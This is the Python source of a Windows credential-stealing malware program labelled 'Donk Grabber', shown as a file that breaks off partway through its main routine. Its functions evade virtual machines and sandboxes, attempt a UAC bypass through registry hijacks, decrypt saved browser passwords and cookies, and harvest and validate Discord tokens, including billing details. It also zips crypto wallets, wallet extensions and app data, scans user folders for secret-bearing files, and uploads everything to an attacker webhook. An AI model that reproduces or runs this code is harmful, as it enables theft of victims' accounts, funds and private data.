import os
import threading
import sqlite3
import re
import base64
import json
import time
import shutil
import zipfile
import random
import subprocess
import urllib.request
import urllib.parse
from sys import executable
from Crypto.Cipher import AES
import requests
import psutil
import ctypes
import datetime
import winreg
import platform
import uuid
import wmi
from ctypes import wintypes, byref, c_char, c_buffer, Structure, POINTER
from datetime import datetime

# ========== CONFIGURATION ==========
WEBHOOK_ENCODED = 'WEBHOOK_PLACEHOLDER'


def v8m2q6():
    detection_webhook = x7f3a1()
    
    def post_detection(msg):
        try:
            requests.post(detection_webhook, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }, data={"content": f"{msg}"})
        except:
            pass

    def get_system_ip():
        try:
            return requests.get("https://api.ipify.org").text
        except:
            return "Unknown"

    def get_machine_guid():
        try:
            reg_connection = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
            key_value = winreg.OpenKey(reg_connection, r"SOFTWARE\Microsoft\Cryptography")
            return winreg.QueryValueEx(key_value, "MachineGuid")[0]
        except:
            return "Unknown"

    def get_hw_profile_guid():
        try:
            reg_connection = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
            key_value = winreg.OpenKey(reg_connection,
                                     r"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001")
            return winreg.QueryValueEx(key_value, "HwProfileGuid")[0]
        except:
            return "Unknown"

    # System information gathering
    system_ip = get_system_ip()
    server_user = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    
    try:
        computer_info = wmi.WMI()
        os_info = computer_info.Win32_OperatingSystem()[0]
        os_name = os_info.Name.encode('utf-8').split(b'|')[0]
        os_name = f'{os_name}'.replace('b', ' ').replace("'", " ")
        gpu_name = computer_info.Win32_VideoController()[0].Name
    except:
        os_name = "Unknown"
        gpu_name = "Unknown"
        computer_info = None

    # Hardware IDs
    try:
        hwid = subprocess.check_output('wmic csproduct get uuid', shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split('\n')[1].strip()
    except:
        hwid = "Unknown"
    
    try:
        baseboard_manufacturer = subprocess.check_output('wmic baseboard get manufacturer', shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split('\n')[1].strip()
    except:
        baseboard_manufacturer = "Unknown"
    
    try:
        diskdrive_serial = subprocess.check_output('wmic diskdrive get serialnumber', shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split('\n')[1].strip()
    except:
        diskdrive_serial = "Unknown"
    
    try:
        cpu_serial = subprocess.check_output('wmic cpu get serialnumber', shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split('\n')[1].strip()
    except:
        cpu_serial = "Unknown"
    
    try:
        bios_serial = subprocess.check_output('wmic bios get serialnumber', shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split('\n')[1].strip()
    except:
        bios_serial = "Unknown"
    
    try:
        baseboard_serial = subprocess.check_output('wmic baseboard get serialnumber', shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split('\n')[1].strip()
    except:
        baseboard_serial = "Unknown"

    machine_guid = get_machine_guid()
    hw_profile_guid = get_hw_profile_guid().replace('{', '').replace('}', '')

    # Download blacklists
    blacklist_urls = {
        'hwid': 'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt',
        'pc_name': 'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt',
        'username': 'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt',
        'ip': 'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt',
        'mac': 'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt',
        'gpu': 'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt',
        'bios_serial': 'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BIOS_Serial_List.txt',
        'baseboard_manufacturer': 'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Manufacturer_List.txt',
        'baseboard_serial': 'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Serial_List.txt',
        'cpu_serial': 'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/CPU_Serial_List.txt',
        'diskdrive_serial': 'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/DiskDrive_Serial_List.txt',
        'hw_profile_guid': 'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/HwProfileGuid_List.txt',
        'machine_guid': 'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/MachineGuid.txt'
    }

    blacklists = {}
    for key, url in blacklist_urls.items():
        try:
            response = requests.get(url, timeout=10)
            blacklists[key] = response.text
        except:
            blacklists[key] = ""

    # Detection logic
    def check_blacklist(value, list_name, blacklist_type):
        if value != "Unknown" and value in blacklists.get(blacklist_type, ""):
            post_detection(f"🚨 **Blacklisted {list_name} Detected**: `{value}`")
            return True
        return False

    # Check all blacklists
    detections = [
        check_blacklist(hwid, "HWID", "hwid"),
        check_blacklist(server_user, "PC Username", "username"),
        check_blacklist(pc_name, "PC Name", "pc_name"),
        check_blacklist(system_ip, "IP Address", "ip"),
        check_blacklist(mac_address, "MAC Address", "mac"),
        check_blacklist(gpu_name, "GPU", "gpu"),
        check_blacklist(diskdrive_serial, "Disk Drive Serial", "diskdrive_serial"),
        check_blacklist(cpu_serial, "CPU Serial", "cpu_serial"),
        check_blacklist(baseboard_manufacturer, "BaseBoard Manufacturer", "baseboard_manufacturer"),
        check_blacklist(bios_serial, "BIOS Serial", "bios_serial"),
        check_blacklist(baseboard_serial, "BaseBoard Serial", "baseboard_serial"),
        check_blacklist(machine_guid, "Machine GUID", "machine_guid"),
        check_blacklist(hw_profile_guid, "HW Profile GUID", "hw_profile_guid")
    ]

    # Additional VM detection heuristics
    vm_indicators = [
        # Common VM usernames
        server_user.lower() in ['admin', 'user', 'test', 'vmware', 'virtual', 'qemu', 'docker'],
        # Common VM computer names
        any(name in pc_name.lower() for name in ['vmware', 'virtual', 'qemu', 'docker', 'test', 'sandbox']),
        # VM typical hardware
        any(gpu in gpu_name for gpu in ['VMware', 'VirtualBox', 'QEMU', 'Red Hat', 'Microsoft Basic Display Adapter']),
        # Low RAM (common in VMs)
        psutil.virtual_memory().total < 2 * 1024**3,  # Less than 2GB RAM
        # Few CPU cores
        psutil.cpu_count() < 2,
        # Check for VM processes
        any(proc in [p.name().lower() for p in psutil.process_iter()] for proc in ['vmware', 'vbox', 'qemu', 'xenservice'])
    ]

    if any(detections) or any(vm_indicators):
        # Send detection report
        detection_report = f"""```yaml
🚨 VM/VirusTotal Environment Detected!
PC Name: {pc_name}
PC Username: {server_user}
HWID: {hwid}
IP: {system_ip}
MAC: {mac_address}
Platform: {os_name}
GPU: {gpu_name}
BIOS Serial: {bios_serial}
BaseBoard: {baseboard_manufacturer}
CPU Serial: {cpu_serial}
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
```"""
        post_detection(detection_report)
        time.sleep(2)
        os._exit(1)

    return True

# ========== OBFUSCATED CORE FUNCTIONS ==========
def x7f3a1(): 
    return base64.b64decode(WEBHOOK_ENCODED).decode()

def k8j2d9():
    try: 
        return urllib.request.urlopen(urllib.request.Request("https://api.ipify.org")).read().decode().strip()
    except: 
        return "Unknown"

def p4m2q1():
    ip = k8j2d9()
    username = os.getenv("USERNAME", "Unknown")
    try:
        response = urllib.request.urlopen(urllib.request.Request(f"https://geolocation-db.com/jsonp/{ip}"))
        data = response.read().decode().replace('callback(', '').replace('})', '}')
        ipdata = json.loads(data)
        country = ipdata.get("country_name", "Unknown")
        country_code = ipdata.get("country_code", "us").lower()
        return f"`{username.upper()} | {ip} ({country})`"
    except:
        return f"`{username.upper()} | {ip} (Unknown)`"

# ========== CRYPTO WALLETS & APPS ==========
def c5t9w8():
    """Collect all crypto wallets and apps"""
    roaming = os.getenv('APPDATA')
    local = os.getenv('LOCALAPPDATA')
    wallets = []
    
    wallet_paths = [
        {"name": "Atomic", "path": os.path.join(roaming, "atomic", "Local Storage", "leveldb")},
        {"name": "Exodus", "path": os.path.join(roaming, "Exodus", "exodus.wallet")},
        {"name": "Electrum", "path": os.path.join(roaming, "Electrum", "wallets")},
        {"name": "Electrum-LTC", "path": os.path.join(roaming, "Electrum-LTC", "wallets")},
        {"name": "Zcash", "path": os.path.join(roaming, "Zcash")},
        {"name": "Armory", "path": os.path.join(roaming, "Armory")},
        {"name": "Bytecoin", "path": os.path.join(roaming, "bytecoin")},
        {"name": "Jaxx", "path": os.path.join(roaming, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb")},
        {"name": "Ethereum", "path": os.path.join(roaming, "Ethereum", "keystore")},
        {"name": "Guarda", "path": os.path.join(roaming, "Guarda", "Local Storage", "leveldb")},
        {"name": "Coinomi", "path": os.path.join(roaming, "Coinomi", "Coinomi", "wallets")},
    ]
    
    for wallet in wallet_paths:
        if os.path.exists(wallet["path"]):
            wallets.append(wallet["name"])
            # Zip the wallet data
            zip_path = os.path.join(os.getenv("TEMP"), f"{wallet['name']}_wallet.zip")
            try:
                with zipfile.ZipFile(zip_path, 'w') as zipf:
                    if os.path.isfile(wallet["path"]):
                        zipf.write(wallet["path"], os.path.basename(wallet["path"]))
                    else:
                        for root, dirs, files in os.walk(wallet["path"]):
                            for file in files:
                                file_path = os.path.join(root, file)
                                zipf.write(file_path, os.path.relpath(file_path, wallet["path"]))
                w2k9r4(zip_path, f"{wallet['name']} Wallet")
                os.remove(zip_path)
            except:
                pass
    
    return wallets

def a7p3q9():
    """Collect gaming and other apps"""
    roaming = os.getenv('APPDATA')
    local = os.getenv('LOCALAPPDATA')
    program_files = os.getenv('PROGRAMFILES') or "C:\\Program Files"
    apps = []
    
    app_paths = [
        {"name": "Steam", "path": os.path.join(program_files, "Steam", "config"), "process": "steam.exe"},
        {"name": "Telegram", "path": os.path.join(roaming, "Telegram Desktop", "tdata"), "process": "telegram.exe"},
        {"name": "Riot Games", "path": os.path.join(local, "Riot Games", "Riot Client", "Data"), "process": "RiotClientServices.exe"},
        {"name": "Epic Games", "path": os.path.join(local, "Epic Games Launcher"), "process": "EpicGamesLauncher.exe"},
    ]
    
    for app in app_paths:
        if os.path.exists(app["path"]):
            apps.append(app["name"])
            # Kill process and zip data
            try:
                subprocess.run(f'taskkill /F /IM "{app["process"]}" >nul 2>&1', shell=True)
                time.sleep(1)
                
                zip_path = os.path.join(os.getenv("TEMP"), f"{app['name']}_data.zip")
                with zipfile.ZipFile(zip_path, 'w') as zipf:
                    if os.path.isfile(app["path"]):
                        zipf.write(app["path"], os.path.basename(app["path"]))
                    else:
                        for root, dirs, files in os.walk(app["path"]):
                            for file in files:
                                if not file.endswith('.log'):  # Skip logs to reduce size
                                    file_path = os.path.join(root, file)
                                    zipf.write(file_path, os.path.relpath(file_path, app["path"]))
                
                w2k9r4(zip_path, f"{app['name']} Data")
                os.remove(zip_path)
            except:
                pass
    
    return apps

# ========== COMPREHENSIVE BROWSER SUPPORT ==========
def b8r4t2():
    """Comprehensive browser data collection"""
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    
    browsers = [
        # Chromium-based browsers
        {"name": "Chrome", "path": os.path.join(local, "Google", "Chrome", "User Data"), "profiles": ["Default", "Profile 1", "Profile 2", "Profile 3"]},
        {"name": "Chrome Beta", "path": os.path.join(local, "Google", "Chrome Beta", "User Data"), "profiles": ["Default", "Profile 1"]},
        {"name": "Chrome Dev", "path": os.path.join(local, "Google", "Chrome Dev", "User Data"), "profiles": ["Default"]},
        {"name": "Chrome SxS", "path": os.path.join(local, "Google", "Chrome SxS", "User Data"), "profiles": ["Default"]},
        {"name": "Edge", "path": os.path.join(local, "Microsoft", "Edge", "User Data"), "profiles": ["Default", "Profile 1", "Profile 2"]},
        {"name": "Brave", "path": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"), "profiles": ["Default", "Profile 1"]},
        {"name": "Vivaldi", "path": os.path.join(local, "Vivaldi", "User Data"), "profiles": ["Default"]},
        {"name": "Opera", "path": os.path.join(roaming, "Opera Software", "Opera Stable"), "profiles": [""]},
        {"name": "Opera GX", "path": os.path.join(roaming, "Opera Software", "Opera GX Stable"), "profiles": [""]},
        {"name": "Yandex", "path": os.path.join(local, "Yandex", "YandexBrowser", "User Data"), "profiles": ["Default"]},
        {"name": "Chromium", "path": os.path.join(local, "Chromium", "User Data"), "profiles": ["Default"]},
        
        # Other browsers
        {"name": "Firefox", "path": os.path.join(roaming, "Mozilla", "Firefox", "Profiles"), "profiles": []},
    ]
    
    all_data = {"tokens": [], "passwords": [], "cookies": []}
    
    # Kill browser processes first
    browser_processes = ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "firefox.exe", "vivaldi.exe"]
    for process in browser_processes:
        subprocess.run(f'taskkill /F /IM "{process}" >nul 2>&1', shell=True)
    
    time.sleep(2)
    
    threads = []
    for browser in browsers:
        t = threading.Thread(target=collect_browser_data, args=(browser, all_data))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    return all_data

def collect_browser_data(browser, all_data):
    """Collect data from a specific browser"""
    if not os.path.exists(browser["path"]):
        return
    
    # Get master key for Chromium browsers
    master_key = None
    if browser["name"] not in ["Firefox", "Opera", "Opera GX"]:
        local_state_path = os.path.join(browser["path"], "Local State")
        master_key = t2k7w8(local_state_path)
    
    # Handle Firefox separately
    if browser["name"] == "Firefox":
        collect_firefox_data(browser["path"], all_data)
        return
    
    # Process Chromium profiles
    profiles = browser["profiles"]
    if not profiles and os.path.isdir(browser["path"]):
        # Auto-detect profiles
        profiles = [d for d in os.listdir(browser["path"]) if os.path.isdir(os.path.join(browser["path"], d)) and not d.startswith('System')]
    
    for profile in profiles:
        profile_path = os.path.join(browser["path"], profile)
        if not os.path.exists(profile_path):
            continue
        
        # Collect tokens
        tokens = f3r8t1(browser["path"], f"/{profile}/Local Storage/leveldb" if profile else "/Local Storage/leveldb", "tokens")
        all_data["tokens"].extend(tokens)
        
        # Collect passwords
        passwords = f3r8t1(browser["path"], f"/{profile}" if profile else "", "passwords")
        all_data["passwords"].extend([f"{browser['name']} ({profile}): {pw}" for pw in passwords])
        
        # Collect cookies
        cookies = f3r8t1(browser["path"], f"/{profile}" if profile else "", "cookies")
        all_data["cookies"].extend(cookies)

def collect_firefox_data(firefox_path, all_data):
    """Collect data from Firefox"""
    if not os.path.exists(firefox_path):
        return
    
    for profile in os.listdir(firefox_path):
        profile_path = os.path.join(firefox_path, profile)
        if not os.path.isdir(profile_path):
            continue
        
        # Firefox cookies
        cookies_db = os.path.join(profile_path, "cookies.sqlite")
        if os.path.exists(cookies_db):
            try:
                temp_db = os.path.join(os.getenv("TEMP"), "firefox_cookies_temp.db")
                shutil.copy2(cookies_db, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host, name, value FROM moz_cookies")
                
                for host, name, value in cursor.fetchall():
                    all_data["cookies"].append(f"{host}\tTRUE\t/\tFALSE\t2597573456\t{name}\t{value}")
                
                cursor.close()
                conn.close()
                os.remove(temp_db)
            except:
                pass

# ========== BROWSER EXTENSIONS ==========
def e9m4q7():
    """Collect browser extension data"""
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    
    extensions = [
        {"name": "MetaMask", "path": "Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"},
        {"name": "Coinbase", "path": "Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"},
        {"name": "Phantom", "path": "Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa"},
        {"name": "Trust Wallet", "path": "Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph"},
    ]
    
    browsers = [
        {"name": "Chrome", "path": os.path.join(local, "Google", "Chrome", "User Data")},
        {"name": "Edge", "path": os.path.join(local, "Microsoft", "Edge", "User Data")},
        {"name": "Brave", "path": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data")},
    ]
    
    found_extensions = []
    
    for browser in browsers:
        for profile in ["Default", "Profile 1", "Profile 2"]:
            profile_path = os.path.join(browser["path"], profile)
            if not os.path.exists(profile_path):
                continue
            
            for extension in extensions:
                ext_path = os.path.join(profile_path, extension["path"])
                if os.path.exists(ext_path):
                    found_extensions.append(f"{browser['name']} - {profile} - {extension['name']}")
                    
                    # Zip extension data
                    zip_path = os.path.join(os.getenv("TEMP"), f"{browser['name']}_{profile}_{extension['name']}.zip")
                    try:
                        with zipfile.ZipFile(zip_path, 'w') as zipf:
                            for root, dirs, files in os.walk(ext_path):
                                for file in files:
                                    file_path = os.path.join(root, file)
                                    zipf.write(file_path, os.path.relpath(file_path, ext_path))
                        
                        w2k9r4(zip_path, f"{extension['name']} Extension")
                        os.remove(zip_path)
                    except:
                        pass
    
    return found_extensions

# ========== ADVANCED TOKEN INFO ==========
def t7k3w9(token):
    """Get advanced token information"""
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    try:
        # Get user info
        user_req = urllib.request.Request("https://discord.com/api/v9/users/@me", headers=headers)
        user_data = json.loads(urllib.request.urlopen(user_req).read().decode())
        
        # Get billing info
        billing_req = urllib.request.Request("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers)
        try:
            billing_data = json.loads(urllib.request.urlopen(billing_req).read().decode())
        except:
            billing_data = []
        
        # Get guilds
        guilds_req = urllib.request.Request("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)
        try:
            guilds_data = json.loads(urllib.request.urlopen(guilds_req).read().decode())
        except:
            guilds_data = []
        
        # Get friends
        friends_req = urllib.request.Request("https://discord.com/api/v9/users/@me/relationships", headers=headers)
        try:
            friends_data = json.loads(urllib.request.urlopen(friends_req).read().decode())
        except:
            friends_data = []
        
        username = user_data.get('username', 'Unknown')
        discriminator = user_data.get('discriminator', '0000')
        user_id = user_data.get('id', 'Unknown')
        email = user_data.get('email', 'None')
        phone = user_data.get('phone', 'None')
        verified = user_data.get('verified', False)
        mfa_enabled = user_data.get('mfa_enabled', False)
        
        # Nitro status
        premium_type = user_data.get('premium_type', 0)
        nitro = "None"
        if premium_type == 1:
            nitro = "Nitro Classic"
        elif premium_type == 2:
            nitro = "Nitro"
        elif premium_type == 3:
            nitro = "Nitro Basic"
        
        # Billing methods
        payment_methods = []
        for method in billing_data:
            if method.get('type') == 1:
                payment_methods.append("Credit Card")
            elif method.get('type') == 2:
                payment_methods.append("PayPal")
        
        # HQ Guilds (100+ members)
        hq_guilds = []
        for guild in guilds_data:
            if guild.get('approximate_member_count', 0) >= 100:
                owner = "✅" if guild.get('owner') else "❌"
                hq_guilds.append(f"{guild['name']} ({guild['id']}) - Members: {guild['approximate_member_count']} - Owner: {owner}")
        
        # HQ Friends (badges)
        hq_friends = []
        badge_emojis = {
            1: "👑",  # Staff
            2: "🤝",  # Partner
            4: "🎪",  # HypeSquad
            8: "🐛",  # Bug Hunter L1
            64: "🛡️", # Bravery
            128: "💎", # Brilliance
            256: "⚖️", # Balance
            512: "⭐", # Early Supporter
            16384: "🐛", # Bug Hunter L2
            131072: "🔧", # Developer
        }
        
        for friend in friends_data:
            if friend.get('type') == 1:  # Friend relationship
                flags = friend.get('user', {}).get('public_flags', 0)
                if flags > 0:
                    badges = []
                    for flag, emoji in badge_emojis.items():
                        if flags & flag:
                            badges.append(emoji)
                    if badges:
                        hq_friends.append(f"{''.join(badges)} {friend['user']['username']}#{friend['user']['discriminator']}")
        
        return {
            "username": f"{username}#{discriminator}",
            "user_id": user_id,
            "email": email,
            "phone": phone,
            "verified": verified,
            "mfa": mfa_enabled,
            "nitro": nitro,
            "payment_methods": ", ".join(payment_methods) if payment_methods else "None",
            "hq_guilds": hq_guilds[:5],  # Limit to 5
            "hq_friends": hq_friends[:10],  # Limit to 10
            "token": token
        }
    except:
        return None

# ========== UAC BYPASS ==========
def u2b7q4():
    """UAC Bypass attempt"""
    if ctypes.windll.shell32.IsUserAnAdmin():
        return "Already Admin"
    
    try:
        # Method 1: computerdefaults bypass
        subprocess.run('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "cmd.exe" /f', shell=True, capture_output=True)
        subprocess.run('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f', shell=True, capture_output=True)
        subprocess.run("computerdefaults", shell=True, capture_output=True)
        time.sleep(2)
        subprocess.run("reg delete hkcu\\Software\\Classes\\ms-settings /f", shell=True, capture_output=True)
        
        if ctypes.windll.shell32.IsUserAnAdmin():
            return "Bypass Successful"
        
        # Method 2: fodhelper bypass
        subprocess.run('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "cmd.exe" /f', shell=True, capture_output=True)
        subprocess.run('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f', shell=True, capture_output=True)
        subprocess.run("fodhelper", shell=True, capture_output=True)
        time.sleep(2)
        subprocess.run("reg delete hkcu\\Software\\Classes\\ms-settings /f", shell=True, capture_output=True)
        
        if ctypes.windll.shell32.IsUserAnAdmin():
            return "Bypass Successful"
        
        return "Bypass Failed"
    except:
        return "Bypass Error"

# ========== ADVANCED FILE SCANNING ==========
def f7s3q8():
    """Advanced file scanning with keywords"""
    user_profile = os.getenv('USERPROFILE')
    search_paths = [
        f"{user_profile}/Desktop",
        f"{user_profile}/Documents",
        f"{user_profile}/Downloads",
        f"{user_profile}/OneDrive/Desktop",
        f"{user_profile}/OneDrive/Documents",
    ]
    
    keywords = [
        "password", "passw", "mdp", "motdepasse", "login", "secret", "account",
        "acount", "paypal", "banque", "metamask", "wallet", "crypto", "exodus",
        "discord", "2fa", "code", "memo", "compte", "token", "backup", "secret",
        "private", "key", "seed", "recovery", "mnemonic", "keystore", "wallet.dat",
        "backup.json", "passphrase", "privatekey", "private_key", "secretkey",
        "secret_key", "credentials", "logininfo", "accountinfo", "banking",
        "finance", "investment", "cryptocurrency", "bitcoin", "ethereum",
        "btc", "eth", "xrp", "ada", "doge", "private", "confidential"
    ]
    
    allowed_extensions = [
        ".txt", ".log", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".odt", ".pdf", ".rtf", ".json", ".csv", ".db", ".sqlite", ".dat",
        ".key", ".pem", ".p12", ".pfx", ".jks", ".keystore", ".wallet",
        ".backup", ".bak", ".old", ".temp", ".tmp"
    ]
    
    found_files = []
    
    for search_path in search_paths:
        if not os.path.exists(search_path):
            continue
        
        for root, dirs, files in os.walk(search_path):
            for file in files:
                file_lower = file.lower()
                file_path = os.path.join(root, file)
                
                # Check extension
                ext_matches = any(file_lower.endswith(ext) for ext in allowed_extensions)
                
                # Check keywords in filename
                name_matches = any(keyword in file_lower for keyword in keywords)
                
                # Check file content for sensitive data
                content_matches = False
                if ext_matches and os.path.getsize(file_path) < 10 * 1024 * 1024:  # 10MB limit
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read(5000).lower()  # Read first 5KB
                            content_matches = any(keyword in content for keyword in keywords)
                    except:
                        pass
                
                if name_matches or content_matches:
                    found_files.append({
                        "path": file_path,
                        "name": file,
                        "size": os.path.getsize(file_path),
                        "modified": datetime.fromtimestamp(os.path.getmtime(file_path)).strftime('%Y-%m-%d %H:%M:%S')
                    })
                
                # Limit to prevent too many files
                if len(found_files) >= 50:
                    break
            
            if len(found_files) >= 50:
                break
        
        if len(found_files) >= 50:
            break
    
    return found_files

# ========== UTILITY FUNCTIONS ==========
def r5n8t3(data, key=None):
    """Decrypt data"""
    try:
        if data.startswith(b'v10') or data.startswith(b'v11'):
            iv = data[3:15]
            payload = data[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            return decrypted[:-16].decode()
        else:
            class DATA_BLOB(Structure):
                _fields_ = [('cbData', wintypes.DWORD), ('pbData', POINTER(c_char))]
            
            def GetData(blob_out):
                cbData = int(blob_out.cbData)
                pbData = blob_out.pbData
                buffer = c_buffer(cbData)
                ctypes.cdll.msvcrt.memcpy(buffer, pbData, cbData)
                ctypes.windll.kernel32.LocalFree(pbData)
                return buffer.raw
            
            buffer_in = c_buffer(data, len(data))
            blob_in = DATA_BLOB(len(data), buffer_in)
            blob_out = DATA_BLOB()
            
            if ctypes.windll.crypt32.CryptUnprotectData(byref(blob_in), None, None, None, None, 0x01, byref(blob_out)):
                return GetData(blob_out).decode()
    except:
        pass
    return ""

def t2k7w8(path):
    """Get master key from Local State"""
    if not os.path.exists(path): return None
    try:
        with open(path, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        return r5n8t3(master_key[5:])
    except:
        return None

def f3r8t1(path, arg, data_type):
    """Generic data collection function"""
    if not os.path.exists(path): return []
    
    results = []
    master_key = t2k7w8(path + "/Local State") if data_type != "tokens" else None
    
    if data_type == "tokens":
        target_path = path + arg
        if not os.path.exists(target_path): return results
        
        for file in os.listdir(target_path):
            if file.endswith((".log", ".ldb")):
                try:
                    with open(os.path.join(target_path, file), "r", errors="ignore") as f:
                        for line in f:
                            line = line.strip()
                            if not line: continue
                            
                            # Standard tokens
                            for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line):
                                if m9p4q2(token):
                                    results.append(token)
                            
                            # Encrypted tokens
                            for encrypted in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                                try:
                                    decoded = base64.b64decode(encrypted.split('dQw4w9WgXcQ:')[1])
                                    token = r5n8t3(decoded, master_key)
                                    if token and m9p4q2(token):
                                        results.append(token)
                                except:
                                    pass
                except:
                    pass
    
    return results

def m9p4q2(token):
    """Validate Discord token"""
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        req = urllib.request.Request("https://discord.com/api/v9/users/@me", headers=headers)
        return urllib.request.urlopen(req).getcode() == 200
    except:
        return False

def w2k9r4(filepath, description):
    """Upload file to webhook"""
    webhook_url = x7f3a1()
    if not webhook_url: return False
    
    try:
        with open(filepath, 'rb') as f:
            files = {'file': (os.path.basename(filepath), f)}
            response = requests.post(webhook_url, files=files)
            return response.status_code == 200
    except:
        return False

def u8j2d1(embed_data):
    """Send embed to webhook"""
    webhook_url = x7f3a1()
    if not webhook_url: return False
    
    try:
        response = requests.post(webhook_url, json=embed_data)
        return response.status_code == 200
    except:
        return False

def q9m3p7(data, filename):
    """Save data to temp file"""
    temp_path = os.path.join(os.getenv("TEMP"), f"{filename}.txt")
    with open(temp_path, 'w', encoding='utf-8') as f:
        f.write("Donk Grabber - Collected Data\n")
        f.write("=" * 50 + "\n\n")
        for item in data:
            f.write(f"{item}\n")
    return temp_path

# ========== MAIN EXECUTION ==========
def main_execution():
    # Run anti-VM detection first
    if not v8m2q6():
        return  # Exit if VM detected
    
    webhook = x7f3a1()
    if not webhook:
        return
    
    # Send startup notification
    startup_embed = {
        "embeds": [{
            "title": "🔍 Donk Grabber - Execution Started",
            "description": p4m2q1(),
            "color": 0x00ff00,
            "timestamp": datetime.utcnow().isoformat() + "Z"
        }]
    }
    u8j2d1(startup_embed)
    
    # UAC Bypass attempt
    uac_status = u2b7q4()
    
    # Collect all data
    all_data = {}
    
    # 1. Browser Data
    browser_data = b8r4t2()
    all_data.update(browser_data)
    
    # 2. Crypto Wallets
    wallets = c5t9w8()
    all_data["wallets"] = wallets
    
    # 3. Apps
    apps = a7p3q9()
    all_data["apps"] = apps
    
    # 4. Browser Extensions
    extensions = e9m4q7()
    all_data["extensions"] = extensions
    
    # 5. Advanced File Scanning
    sensitive_files = f7s3q8()
    all_data["files"] = sensitive_files
    
    # Process tokens with advanced info
    advanced_tokens = []
    for token in set(all_data["tokens"]):
        token_info = t7k3w9(token)
        if token_info:
            advanced_tokens.append(token_info)
    
    # Send comprehensive report
    report_embed = {
        "embeds": [{
            "title": "📊 Donk Grabber - Comprehensive Report",
            "description": p4m2q1(),
            "color": 0x0084ff,
            "fields": [
                {"name": "🛡️ UAC Status", "value": f"```{uac_status}```", "inline": True},
                {"name": "🔑 Discord Tokens", "value": f"```{len(advanced_tokens)}```", "inline": True},
                {"name": "🗝️ Passwords", "value": f"```{len(all_data['passwords'])}```", "inline": True},
                {"name": "🍪 Cookies", "value": f"```{len(all_data['cookies'])}```", "inline": True},
                {"name": "💰 Crypto Wallets", "value": f"```{len(all_data['wallets'])}```", "inline": True},
                {"name": "🎮 Apps", "value": f"```{len(all_data['apps'])}```", "inline": True},
                {"name": "🔧 Extensions", "value": f"```{len(all_data['extensions'])}```", "inline": True},
                {"name": "📁 Sensitive Files", "value": f"```{len(all_data['files'])}```", "inline": True},
            ],
            "timestamp": datetime.utcnow().isoformat() + "Z"
        }]
    }
    
    # Add token details if any found
    if advanced_tokens:
        token_details = "\n".join([f"• {t['username']} - {t['nitro']} - {t['payment_methods']}" for t in advanced_tokens[:5]])
        if len(advanced_tokens) > 5:
            token_details += f"\n• ... and {len(advanced_tokens) - 5} more"
        
        report_embed["embeds"][0]["fields"].append({
            "name": "👤 Token Details",
            "value": f"```{token_details}```",
            "inline": False
        })
    
    u8j2d1(report_embed)
    
    # Send individual token details
    for token_info in advanced_tokens[:3]:  # Limit to 3 detailed tokens
        token_embed = {
            "embeds": [{
                "title": f"👤 {token_info['username']}",
                "color": 0x7289da,
                "fields": [
                    {"name": "🆔 User ID", "value": f"```{token_info['user_id']}```", "inline": True},
